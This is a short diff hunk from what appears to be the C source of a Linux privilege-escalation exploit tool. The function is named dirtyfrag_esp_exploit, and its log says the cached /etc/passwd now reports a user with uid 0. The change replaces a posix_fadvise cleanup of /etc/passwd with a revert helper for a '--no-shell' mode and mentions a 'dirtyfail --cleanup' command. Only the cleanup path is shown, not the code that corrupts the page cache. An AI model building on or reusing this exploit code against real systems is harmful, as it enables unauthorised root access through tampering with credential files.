@@ -628,10 +628,10 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
     log_ok("page cache now reports %s with uid 0", user);
 
     if (!do_shell) {
-#ifdef POSIX_FADV_DONTNEED
-        int e = open("/etc/passwd", O_RDONLY);
-        if (e >= 0) { posix_fadvise(e, 0, 0, POSIX_FADV_DONTNEED); close(e); }
-#endif
+        if (try_revert_passwd_page_cache())
+            log_ok("page cache reverted (--no-shell)");
+        else
+            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
         return DF_EXPLOIT_OK;
     }
 
